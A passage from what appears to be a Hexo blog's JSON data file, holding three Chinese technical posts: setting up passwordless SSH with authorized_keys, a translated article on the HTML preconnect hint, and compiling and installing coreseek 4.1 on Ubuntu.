后,服务器会据此判断是否可以免除密码认证过程\n\n&nbsp;\n\n#### 服务端的配置\n\n创建自动认证文件,如果没有的话\n```\n$ touch ~/.ssh/authorized_keys\n```\n设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效\n```\n$ chmod 644 ~/.ssh/authorized_keys\n```\n将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行\n```\n$ vi ~/.ssh/authorized_keys\n```","slug":"ssh-e5-85-8d-e7-99-bb-e9-99-86-authorized-keys","published":1,"updated":"2018-03-05T12:55:52.976Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhww002vlzlmx877990o","content":"<h3 id=\"authorized-keys\"><a href=\"#authorized-keys\" class=\"headerlink\" title=\"authorized_keys\"></a>authorized_keys</h3><p>这是通用的做法，将本地机器的 <code>id_rsa.pub</code> 公匙字符串拷贝下来，追加到服务器的 <code>~/.ssh/authorized_keys</code> 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．</p>\n<h4 id=\"客户端的配置\"><a href=\"#客户端的配置\" class=\"headerlink\" title=\"客户端的配置\"></a>客户端的配置</h4><h5 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h5><p>创建客户端ssh key,回车选默认的即可<br>创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh-keygen</span><br></pre></td></tr></table></figure></p>\n<p>打印认证公匙,复制然后开始下一步<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure></p>\n<p>公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程</p>\n<p>&nbsp;</p>\n<h4 id=\"服务端的配置\"><a href=\"#服务端的配置\" class=\"headerlink\" title=\"服务端的配置\"></a>服务端的配置</h4><p>创建自动认证文件,如果没有的话<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ touch ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n<p>设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ chmod 644 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n<p>将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ vi ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<h3 id=\"authorized-keys\"><a href=\"#authorized-keys\" class=\"headerlink\" title=\"authorized_keys\"></a>authorized_keys</h3><p>这是通用的做法，将本地机器的 <code>id_rsa.pub</code> 公匙字符串拷贝下来，追加到服务器的 <code>~/.ssh/authorized_keys</code> 文件下，作为一行,并且保持其它人不可写的权限,就可以不用再输入密码．</p>\n<h4 id=\"客户端的配置\"><a href=\"#客户端的配置\" class=\"headerlink\" title=\"客户端的配置\"></a>客户端的配置</h4><h5 id=\"linux\"><a href=\"#linux\" class=\"headerlink\" title=\"linux\"></a>linux</h5><p>创建客户端ssh key,回车选默认的即可<br>创建程序会询问你的key存放位置,以及加密密码等,回车选则默认即可<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ ssh-keygen</span><br></pre></td></tr></table></figure></p>\n<p>打印认证公匙,复制然后开始下一步<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ cat ~/.ssh/id_rsa.pub</span><br></pre></td></tr></table></figure></p>\n<p>公匙 ~/.ssh/id_rsa.pub 是每次登录ssh时都会发送的,因而把其加入到服务器的 ~/.ssh/authorized_keys 后,服务器会据此判断是否可以免除密码认证过程</p>\n<p>&nbsp;</p>\n<h4 id=\"服务端的配置\"><a href=\"#服务端的配置\" class=\"headerlink\" title=\"服务端的配置\"></a>服务端的配置</h4><p>创建自动认证文件,如果没有的话<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ touch ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n<p>设置该文件权限为其它人不可写,权限限制是必须的,否则将不会生效<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ chmod 644 ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n<p>将在客户端拷贝的 ~/.ssh/id_rsa.pub 内容追加到认证文件,它只占一行<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ vi ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure></p>\n"},{"title":"[译]使用preconnect减小延迟","date":"2018-03-05T18:28:26.000Z","_content":"\n> 本文翻译自 [Eliminating Roundtrips with Preconnect](https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/) ，作者 Ilya Grigorik 著有[《High Performance Browser Networking - O'Reilly》](https://hpbn.co/?utm_source=igvita&utm_medium=referral&utm_campaign=igvita-footer)\n\n在实际的请求内容发送到服务器之前，建立HTTP连接的“简单”动作可能会产生很多往返数据包：浏览器需要先解析DNS名称，执行TCP握手，如果是HTTPS还需要建立TLS加密隧道。这些动作都将会阻塞获取数据，在网速不佳或者移动网络上问题会更突出。\n\n![xsocket-setup](https://www.igvita.com/posts/15/xsocket-setup.png.pagespeed.ic.SvciYHBRv0.webp)\n\n现代浏览器会[尽力预测](https://www.igvita.com/posa/high-performance-networking-in-google-chrome/#tcp-pre-connect)要预先建立的连接。通过提前启动预连接，浏览器可以在实际请求创建前就完成DNS/TCP/TLS往返。但浏览器还做不到很聪明，无法准确预测每个网站的预连接目标。\n\n**好消息是现在可以了：由开发者告知浏览器需要预连接的目标，Firefox 39和Chrome 46都已支持这项特性！详细兼容性：[caniuse.com](https://caniuse.com/#feat=link-rel-preconnect)**\n\n## 预先连接动态请求的URL\n\n由于是否加载的逻辑，UserAgent适配或其它原因，应用程序可能无法确定要加载的资源URL。但是，如果资源的归属的服务器是确定好的，则预连接正好适用，比如谷歌字体服务，总是需要连接 *fonts.gstatic.com*，以下是未使用/使用预连接的示例：\n\n![xfont-preconnect](https://www.igvita.com/posts/15/xfont-preconnect.png.pagespeed.ic.pi46037zWI.webp)\n\n上面第一个加载过程中，浏览器执行HTML后先请求CSS资源 *fonts.googleapis.com* ，然后确定要使用的字体，再连接 *fonts.gstatic.com* - 连接过程是依次进行的，比较慢。\n\n```\n<link href='https://fonts.gstatic.com' rel='preconnect' crossorigin>\n<link href='https://fonts.googleapis.com/css?family=Roboto+Slab:700|Open+Sans' rel='stylesheet'>\n```\n\n而在第二个加载过程中，我们在`<link>`中加入了`preconnect`预连接提示，指定应用将从`fonts.gstatic.com`中获取资源。因此，浏览器将与CSS请求并行，提前建立连接，从而可以立即加载字体！在这种特定情况下，预连接可以减少加载字体的耗时，尽早呈现内容。\n\n> 按照 [字体加载规范](https://www.w3.org/TR/css-fonts-3/#font-fetching-requirements)，我们必须加上`crossorigin`的属性，\n\n\n## 通过HTTP响应头启动预连接\n\n除了通过HTML的`<link>`声明外，我们还可以通过响应header的`Link`报头来指定，不用修改HTML。**`Link`报头机制允许多个响应，表示应该提前连接的额外来源**。例如服务器端渲染的组件可以通过添加header来优化依赖资源的加载性能。\n\n![xpreconnect-header](https://www.igvita.com/posts/15/xpreconnect-header.png.pagespeed.ic.C9-EQcMnlu.webp)\n\n## 用javascript预先连接\n\n我们不需要预先声明所有preconnect源。借助JavaScript，应用程序可以响应用户输入，预期活动或其他用户信号调用预连接。例如，考虑应用程序预期可能的导航目标并发出提前预连接的情况：\n\n```\nfunction preconnectTo(url) {\n    var hint = document.createElement(\"link\");\n    hint.rel = \"preconnect\";\n    hint.href = url;\n    document.head.appendChild(hint);\n}\n```\n\n![xreactive-preconnect](https://www.igvita.com/posts/15/xreactive-preconnect.png.pagespeed.ic.6-2JQXfomz.webp)\n\n如图，用户进入jsbin.com; 在第3秒时，页面javascript判断用户可能要点击导航（mouseover等手段），就此启动预连接; 在第5秒时，用户真的点击了，此时连接已建立，请求不受阻塞地发送了 - 几乎为跳转节省了一秒钟！\n\n## 适当的使用预连接\n\nPreconnect是优化工具箱中的重要工具。如上面的例子所示，它可以避免获取资源时的阻塞 - 在某些情况下，请求延迟可以减少数百甚至数千毫秒。同时要明智的使用它：每个打开的TCP连接都会在客户端和服务器上产生成本，避免打开不会使用到的连接。\n\n## 如何调试\n\n在chrome的network面板上，不会显示preconnect优化的请求，因为它和主线程没关系。可以在 [webpagetest.org](https://www.webpagetest.org/) 上在线调试，查看完整的请求timeline。\n","source":"_posts/translate-eliminating-roundtrips-with-preconnect.md","raw":"---\ntitle: \"[译]使用preconnect减小延迟\"\ncategories:\n  - html5\ndate: 2018-03-06 02:28:26\n---\n\n> 本文翻译自 [Eliminating Roundtrips with Preconnect](https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/) ，作者 Ilya Grigorik 著有[《High Performance Browser Networking - O'Reilly》](https://hpbn.co/?utm_source=igvita&utm_medium=referral&utm_campaign=igvita-footer)\n\n在实际的请求内容发送到服务器之前，建立HTTP连接的“简单”动作可能会产生很多往返数据包：浏览器需要先解析DNS名称，执行TCP握手，如果是HTTPS还需要建立TLS加密隧道。这些动作都将会阻塞获取数据，在网速不佳或者移动网络上问题会更突出。\n\n![xsocket-setup](https://www.igvita.com/posts/15/xsocket-setup.png.pagespeed.ic.SvciYHBRv0.webp)\n\n现代浏览器会[尽力预测](https://www.igvita.com/posa/high-performance-networking-in-google-chrome/#tcp-pre-connect)要预先建立的连接。通过提前启动预连接，浏览器可以在实际请求创建前就完成DNS/TCP/TLS往返。但浏览器还做不到很聪明，无法准确预测每个网站的预连接目标。\n\n**好消息是现在可以了：由开发者告知浏览器需要预连接的目标，Firefox 39和Chrome 46都已支持这项特性！详细兼容性：[caniuse.com](https://caniuse.com/#feat=link-rel-preconnect)**\n\n## 预先连接动态请求的URL\n\n由于是否加载的逻辑，UserAgent适配或其它原因，应用程序可能无法确定要加载的资源URL。但是，如果资源的归属的服务器是确定好的，则预连接正好适用，比如谷歌字体服务，总是需要连接 *fonts.gstatic.com*，以下是未使用/使用预连接的示例：\n\n![xfont-preconnect](https://www.igvita.com/posts/15/xfont-preconnect.png.pagespeed.ic.pi46037zWI.webp)\n\n上面第一个加载过程中，浏览器执行HTML后先请求CSS资源 *fonts.googleapis.com* ，然后确定要使用的字体，再连接 *fonts.gstatic.com* - 连接过程是依次进行的，比较慢。\n\n```\n<link href='https://fonts.gstatic.com' rel='preconnect' crossorigin>\n<link href='https://fonts.googleapis.com/css?family=Roboto+Slab:700|Open+Sans' rel='stylesheet'>\n```\n\n而在第二个加载过程中，我们在`<link>`中加入了`preconnect`预连接提示，指定应用将从`fonts.gstatic.com`中获取资源。因此，浏览器将与CSS请求并行，提前建立连接，从而可以立即加载字体！在这种特定情况下，预连接可以减少加载字体的耗时，尽早呈现内容。\n\n> 按照 [字体加载规范](https://www.w3.org/TR/css-fonts-3/#font-fetching-requirements)，我们必须加上`crossorigin`的属性，\n\n\n## 通过HTTP响应头启动预连接\n\n除了通过HTML的`<link>`声明外，我们还可以通过响应header的`Link`报头来指定，不用修改HTML。**`Link`报头机制允许多个响应，表示应该提前连接的额外来源**。例如服务器端渲染的组件可以通过添加header来优化依赖资源的加载性能。\n\n![xpreconnect-header](https://www.igvita.com/posts/15/xpreconnect-header.png.pagespeed.ic.C9-EQcMnlu.webp)\n\n## 用javascript预先连接\n\n我们不需要预先声明所有preconnect源。借助JavaScript，应用程序可以响应用户输入，预期活动或其他用户信号调用预连接。例如，考虑应用程序预期可能的导航目标并发出提前预连接的情况：\n\n```\nfunction preconnectTo(url) {\n    var hint = document.createElement(\"link\");\n    hint.rel = \"preconnect\";\n    hint.href = url;\n    document.head.appendChild(hint);\n}\n```\n\n![xreactive-preconnect](https://www.igvita.com/posts/15/xreactive-preconnect.png.pagespeed.ic.6-2JQXfomz.webp)\n\n如图，用户进入jsbin.com; 在第3秒时，页面javascript判断用户可能要点击导航（mouseover等手段），就此启动预连接; 在第5秒时，用户真的点击了，此时连接已建立，请求不受阻塞地发送了 - 几乎为跳转节省了一秒钟！\n\n## 适当的使用预连接\n\nPreconnect是优化工具箱中的重要工具。如上面的例子所示，它可以避免获取资源时的阻塞 - 在某些情况下，请求延迟可以减少数百甚至数千毫秒。同时要明智的使用它：每个打开的TCP连接都会在客户端和服务器上产生成本，避免打开不会使用到的连接。\n\n## 如何调试\n\n在chrome的network面板上，不会显示preconnect优化的请求，因为它和主线程没关系。可以在 [webpagetest.org](https://www.webpagetest.org/) 上在线调试，查看完整的请求timeline。\n","slug":"translate-eliminating-roundtrips-with-preconnect","published":1,"updated":"2018-03-06T01:51:15.127Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjef4yhwy002xlzlmdvfnnj6s","content":"<blockquote>\n<p>本文翻译自 <a href=\"https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/\" target=\"_blank\" rel=\"noopener\">Eliminating Roundtrips with Preconnect</a> ，作者 Ilya Grigorik 著有<a href=\"https://hpbn.co/?utm_source=igvita&amp;utm_medium=referral&amp;utm_campaign=igvita-footer\" target=\"_blank\" rel=\"noopener\">《High Performance Browser Networking - O’Reilly》</a></p>\n</blockquote>\n<p>在实际的请求内容发送到服务器之前，建立HTTP连接的“简单”动作可能会产生很多往返数据包：浏览器需要先解析DNS名称，执行TCP握手，如果是HTTPS还需要建立TLS加密隧道。这些动作都将会阻塞获取数据，在网速不佳或者移动网络上问题会更突出。</p>\n<p><img src=\"https://www.igvita.com/posts/15/xsocket-setup.png.pagespeed.ic.SvciYHBRv0.webp\" alt=\"xsocket-setup\"></p>\n<p>现代浏览器会<a href=\"https://www.igvita.com/posa/high-performance-networking-in-google-chrome/#tcp-pre-connect\" target=\"_blank\" rel=\"noopener\">尽力预测</a>要预先建立的连接。通过提前启动预连接，浏览器可以在实际请求创建前就完成DNS/TCP/TLS往返。但浏览器还做不到很聪明，无法准确预测每个网站的预连接目标。</p>\n<p><strong>好消息是现在可以了：由开发者告知浏览器需要预连接的目标，Firefox 39和Chrome 46都已支持这项特性！详细兼容性：<a href=\"https://caniuse.com/#feat=link-rel-preconnect\" target=\"_blank\" rel=\"noopener\">caniuse.com</a></strong></p>\n<h2 id=\"预先连接动态请求的URL\"><a href=\"#预先连接动态请求的URL\" class=\"headerlink\" title=\"预先连接动态请求的URL\"></a>预先连接动态请求的URL</h2><p>由于是否加载的逻辑，UserAgent适配或其它原因，应用程序可能无法确定要加载的资源URL。但是，如果资源的归属的服务器是确定好的，则预连接正好适用，比如谷歌字体服务，总是需要连接 <em>fonts.gstatic.com</em>，以下是未使用/使用预连接的示例：</p>\n<p><img src=\"https://www.igvita.com/posts/15/xfont-preconnect.png.pagespeed.ic.pi46037zWI.webp\" alt=\"xfont-preconnect\"></p>\n<p>上面第一个加载过程中，浏览器执行HTML后先请求CSS资源 <em>fonts.googleapis.com</em> ，然后确定要使用的字体，再连接 <em>fonts.gstatic.com</em> - 连接过程是依次进行的，比较慢。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;link href=&apos;https://fonts.gstatic.com&apos; rel=&apos;preconnect&apos; crossorigin&gt;</span><br><span class=\"line\">&lt;link href=&apos;https://fonts.googleapis.com/css?family=Roboto+Slab:700|Open+Sans&apos; rel=&apos;stylesheet&apos;&gt;</span><br></pre></td></tr></table></figure>\n<p>而在第二个加载过程中，我们在<code>&lt;link&gt;</code>中加入了<code>preconnect</code>预连接提示，指定应用将从<code>fonts.gstatic.com</code>中获取资源。因此，浏览器将与CSS请求并行，提前建立连接，从而可以立即加载字体！在这种特定情况下，预连接可以减少加载字体的耗时，尽早呈现内容。</p>\n<blockquote>\n<p>按照 <a href=\"https://www.w3.org/TR/css-fonts-3/#font-fetching-requirements\" target=\"_blank\" rel=\"noopener\">字体加载规范</a>，我们必须加上<code>crossorigin</code>的属性，</p>\n</blockquote>\n<h2 id=\"通过HTTP响应头启动预连接\"><a href=\"#通过HTTP响应头启动预连接\" class=\"headerlink\" title=\"通过HTTP响应头启动预连接\"></a>通过HTTP响应头启动预连接</h2><p>除了通过HTML的<code>&lt;link&gt;</code>声明外，我们还可以通过响应header的<code>Link</code>报头来指定，不用修改HTML。<strong><code>Link</code>报头机制允许多个响应，表示应该提前连接的额外来源</strong>。例如服务器端渲染的组件可以通过添加header来优化依赖资源的加载性能。</p>\n<p><img src=\"https://www.igvita.com/posts/15/xpreconnect-header.png.pagespeed.ic.C9-EQcMnlu.webp\" alt=\"xpreconnect-header\"></p>\n<h2 id=\"用javascript预先连接\"><a href=\"#用javascript预先连接\" class=\"headerlink\" title=\"用javascript预先连接\"></a>用javascript预先连接</h2><p>我们不需要预先声明所有preconnect源。借助JavaScript，应用程序可以响应用户输入，预期活动或其他用户信号调用预连接。例如，考虑应用程序预期可能的导航目标并发出提前预连接的情况：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function preconnectTo(url) &#123;</span><br><span class=\"line\">    var hint = document.createElement(&quot;link&quot;);</span><br><span class=\"line\">    hint.rel = &quot;preconnect&quot;;</span><br><span class=\"line\">    hint.href = url;</span><br><span class=\"line\">    document.head.appendChild(hint);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://www.igvita.com/posts/15/xreactive-preconnect.png.pagespeed.ic.6-2JQXfomz.webp\" alt=\"xreactive-preconnect\"></p>\n<p>如图，用户进入jsbin.com; 在第3秒时，页面javascript判断用户可能要点击导航（mouseover等手段），就此启动预连接; 在第5秒时，用户真的点击了，此时连接已建立，请求不受阻塞地发送了 - 几乎为跳转节省了一秒钟！</p>\n<h2 id=\"适当的使用预连接\"><a href=\"#适当的使用预连接\" class=\"headerlink\" title=\"适当的使用预连接\"></a>适当的使用预连接</h2><p>Preconnect是优化工具箱中的重要工具。如上面的例子所示，它可以避免获取资源时的阻塞 - 在某些情况下，请求延迟可以减少数百甚至数千毫秒。同时要明智的使用它：每个打开的TCP连接都会在客户端和服务器上产生成本，避免打开不会使用到的连接。</p>\n<h2 id=\"如何调试\"><a href=\"#如何调试\" class=\"headerlink\" title=\"如何调试\"></a>如何调试</h2><p>在chrome的network面板上，不会显示preconnect优化的请求，因为它和主线程没关系。可以在 <a href=\"https://www.webpagetest.org/\" target=\"_blank\" rel=\"noopener\">webpagetest.org</a> 上在线调试，查看完整的请求timeline。</p>\n","site":{"data":{}},"excerpt":"","more":"<blockquote>\n<p>本文翻译自 <a href=\"https://www.igvita.com/2015/08/17/eliminating-roundtrips-with-preconnect/\" target=\"_blank\" rel=\"noopener\">Eliminating Roundtrips with Preconnect</a> ，作者 Ilya Grigorik 著有<a href=\"https://hpbn.co/?utm_source=igvita&amp;utm_medium=referral&amp;utm_campaign=igvita-footer\" target=\"_blank\" rel=\"noopener\">《High Performance Browser Networking - O’Reilly》</a></p>\n</blockquote>\n<p>在实际的请求内容发送到服务器之前，建立HTTP连接的“简单”动作可能会产生很多往返数据包：浏览器需要先解析DNS名称，执行TCP握手，如果是HTTPS还需要建立TLS加密隧道。这些动作都将会阻塞获取数据，在网速不佳或者移动网络上问题会更突出。</p>\n<p><img src=\"https://www.igvita.com/posts/15/xsocket-setup.png.pagespeed.ic.SvciYHBRv0.webp\" alt=\"xsocket-setup\"></p>\n<p>现代浏览器会<a href=\"https://www.igvita.com/posa/high-performance-networking-in-google-chrome/#tcp-pre-connect\" target=\"_blank\" rel=\"noopener\">尽力预测</a>要预先建立的连接。通过提前启动预连接，浏览器可以在实际请求创建前就完成DNS/TCP/TLS往返。但浏览器还做不到很聪明，无法准确预测每个网站的预连接目标。</p>\n<p><strong>好消息是现在可以了：由开发者告知浏览器需要预连接的目标，Firefox 39和Chrome 46都已支持这项特性！详细兼容性：<a href=\"https://caniuse.com/#feat=link-rel-preconnect\" target=\"_blank\" rel=\"noopener\">caniuse.com</a></strong></p>\n<h2 id=\"预先连接动态请求的URL\"><a href=\"#预先连接动态请求的URL\" class=\"headerlink\" title=\"预先连接动态请求的URL\"></a>预先连接动态请求的URL</h2><p>由于是否加载的逻辑，UserAgent适配或其它原因，应用程序可能无法确定要加载的资源URL。但是，如果资源的归属的服务器是确定好的，则预连接正好适用，比如谷歌字体服务，总是需要连接 <em>fonts.gstatic.com</em>，以下是未使用/使用预连接的示例：</p>\n<p><img src=\"https://www.igvita.com/posts/15/xfont-preconnect.png.pagespeed.ic.pi46037zWI.webp\" alt=\"xfont-preconnect\"></p>\n<p>上面第一个加载过程中，浏览器执行HTML后先请求CSS资源 <em>fonts.googleapis.com</em> ，然后确定要使用的字体，再连接 <em>fonts.gstatic.com</em> - 连接过程是依次进行的，比较慢。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;link href=&apos;https://fonts.gstatic.com&apos; rel=&apos;preconnect&apos; crossorigin&gt;</span><br><span class=\"line\">&lt;link href=&apos;https://fonts.googleapis.com/css?family=Roboto+Slab:700|Open+Sans&apos; rel=&apos;stylesheet&apos;&gt;</span><br></pre></td></tr></table></figure>\n<p>而在第二个加载过程中，我们在<code>&lt;link&gt;</code>中加入了<code>preconnect</code>预连接提示，指定应用将从<code>fonts.gstatic.com</code>中获取资源。因此，浏览器将与CSS请求并行，提前建立连接，从而可以立即加载字体！在这种特定情况下，预连接可以减少加载字体的耗时，尽早呈现内容。</p>\n<blockquote>\n<p>按照 <a href=\"https://www.w3.org/TR/css-fonts-3/#font-fetching-requirements\" target=\"_blank\" rel=\"noopener\">字体加载规范</a>，我们必须加上<code>crossorigin</code>的属性，</p>\n</blockquote>\n<h2 id=\"通过HTTP响应头启动预连接\"><a href=\"#通过HTTP响应头启动预连接\" class=\"headerlink\" title=\"通过HTTP响应头启动预连接\"></a>通过HTTP响应头启动预连接</h2><p>除了通过HTML的<code>&lt;link&gt;</code>声明外，我们还可以通过响应header的<code>Link</code>报头来指定，不用修改HTML。<strong><code>Link</code>报头机制允许多个响应，表示应该提前连接的额外来源</strong>。例如服务器端渲染的组件可以通过添加header来优化依赖资源的加载性能。</p>\n<p><img src=\"https://www.igvita.com/posts/15/xpreconnect-header.png.pagespeed.ic.C9-EQcMnlu.webp\" alt=\"xpreconnect-header\"></p>\n<h2 id=\"用javascript预先连接\"><a href=\"#用javascript预先连接\" class=\"headerlink\" title=\"用javascript预先连接\"></a>用javascript预先连接</h2><p>我们不需要预先声明所有preconnect源。借助JavaScript，应用程序可以响应用户输入，预期活动或其他用户信号调用预连接。例如，考虑应用程序预期可能的导航目标并发出提前预连接的情况：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function preconnectTo(url) &#123;</span><br><span class=\"line\">    var hint = document.createElement(&quot;link&quot;);</span><br><span class=\"line\">    hint.rel = &quot;preconnect&quot;;</span><br><span class=\"line\">    hint.href = url;</span><br><span class=\"line\">    document.head.appendChild(hint);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img src=\"https://www.igvita.com/posts/15/xreactive-preconnect.png.pagespeed.ic.6-2JQXfomz.webp\" alt=\"xreactive-preconnect\"></p>\n<p>如图，用户进入jsbin.com; 在第3秒时，页面javascript判断用户可能要点击导航（mouseover等手段），就此启动预连接; 在第5秒时，用户真的点击了，此时连接已建立，请求不受阻塞地发送了 - 几乎为跳转节省了一秒钟！</p>\n<h2 id=\"适当的使用预连接\"><a href=\"#适当的使用预连接\" class=\"headerlink\" title=\"适当的使用预连接\"></a>适当的使用预连接</h2><p>Preconnect是优化工具箱中的重要工具。如上面的例子所示，它可以避免获取资源时的阻塞 - 在某些情况下，请求延迟可以减少数百甚至数千毫秒。同时要明智的使用它：每个打开的TCP连接都会在客户端和服务器上产生成本，避免打开不会使用到的连接。</p>\n<h2 id=\"如何调试\"><a href=\"#如何调试\" class=\"headerlink\" title=\"如何调试\"></a>如何调试</h2><p>在chrome的network面板上，不会显示preconnect优化的请求，因为它和主线程没关系。可以在 <a href=\"https://www.webpagetest.org/\" target=\"_blank\" rel=\"noopener\">webpagetest.org</a> 上在线调试，查看完整的请求timeline。</p>\n"},{"title":"ubuntu安装coreseek4.1","id":"27","date":"2014-07-11T08:36:10.000Z","_content":"\n目录规划：\n\n此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下\n\n索引和日志放在 /alidata/coreseek/ 下\n\n&nbsp;\n\n下载源码包，包里集成了coreseek4.1 mmseg3.1.4\n```\nwget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz\n```\n&nbsp;\n\n安装libtool (coreseek需要)\n```\napt-get install libtool\n```\n&nbsp;\n\n实际安装: libltdl-dev libltdl7 libtool\n\n安装mysql开发者包\n```\nsudo apt-get install mysql-devel\n```\n&nbsp;\n\n实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common\n\n&nbsp;\n\n安装 mmseg  (源码集成在 coreseek-4.1-beta)\n```\ncd  mmseg-3.2.14/\n\n# 包内自带的编译前初始化工具\n\n./bootstrap \n\n# 安装到 /server/mmseg-3.2.14\n\n./configure --prefix=/server/mmseg-3.2.14\n\nmake &amp;&amp; make install\n```\n&nbsp;\n\n安装 coreseek\n```\n# 包内自带的编译前初始化工具\n./buildconf.sh\n./configure --prefix=/server/coreseek-4.1 --with-mysql --with-mmseg --with-mysql-includes=/usr/include/mysql --with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg --with-mmseg-libs=/server/mmseg-3.2.14/lib\nmake &amp;&amp; make install\n```\n-------------------- 安装完成 ---------------\n\n创建索引数据与日志的目录：\n```\nmkdir /alidata/coreseek\nmkdir /alidata/coreseek/index\nmkdir /alidata/coreseek/log\n```\n&nbsp;\n\n&nbsp;\n\n添加配置文件\n```\n# 从 xueba-tiku 仓库中提取sphinx的配置文件\n\nln -s /home/pxk/www/xueba-tiku/protected/data/sphinx.conf  /server/coreseek-4.1/etc/\n\n# 修改配置 /server/coreseek-4.1/etc/sphinx.conf 中的路径和数据库参数\n\n# 添加词库 （词库在仓库里）\n\n/server/mmseg-3.2.14/bin/mmseg -u /home/pxk/www/xueba-tiku/protected/data/edu.txt\n\n# 添加stopword.txt （忽略词汇）\n\nln -s /home/pxk/www/xueba-tiku/protected/data/stopwords.txt /server/coreseek-4.1/etc/\n```\n&nbsp;\n\n&nbsp;\n\n--------------------------- 配置完成 ---------------------------\n```\n# 创建索引数据\n\n/server/coreseek-4.1/bin/indexer --config /server/coreseek-4.1/etc/sphinx.conf --all\n\n# 启动搜索服务后台进程\n\n/server/coreseek-4.1/bin/searchd --config /server/coreseek-4.1/etc/sphinx.conf\n```\n&nbsp;\n\n&nbsp;","source":"_posts/ubuntu-e5-ae-89-e8-a3-85coreseek4-1.md","raw":"---\ntitle: ubuntu安装coreseek4.1\nid: 27\ncategories:\n  - sphinx\ndate: 2014-07-11 16:36:10\ntags:\n---\n\n目录规划：\n\n此过程将编译两个包， mmseg-3.2.14 和 coreseek-4.1，它们都将包含版本号放置在 /server 下\n\n索引和日志放在 /alidata/coreseek/ 下\n\n&nbsp;\n\n下载源码包，包里集成了coreseek4.1 mmseg3.1.4\n```\nwget http://www.coreseek.cn/uploads/csft/4.0/coreseek-4.1-beta.tar.gz\n```\n&nbsp;\n\n安装libtool (coreseek需要)\n```\napt-get install libtool\n```\n&nbsp;\n\n实际安装: libltdl-dev libltdl7 libtool\n\n安装mysql开发者包\n```\nsudo apt-get install mysql-devel\n```\n&nbsp;\n\n实际安装: libmysqlclient-dev libmysqlclient18 libmysqld-dev mysql-common\n\n&nbsp;\n\n安装 mmseg  (源码集成在 coreseek-4.1-beta)\n```\ncd  mmseg-3.2.14/\n\n# 包内自带的编译前初始化工具\n\n./bootstrap \n\n# 安装到 /server/mmseg-3.2.14\n\n./configure --prefix=/server/mmseg-3.2.14\n\nmake &amp;&amp; make install\n```\n&nbsp;\n\n安装 coreseek\n```\n# 包内自带的编译前初始化工具\n./buildconf.sh\n./configure --prefix=/server/coreseek-4.1 --with-mysql --with-mmseg --with-mysql-includes=/usr/include/mysql --with-mmseg-includes=/server/mmseg-3.2.14/include/mmseg 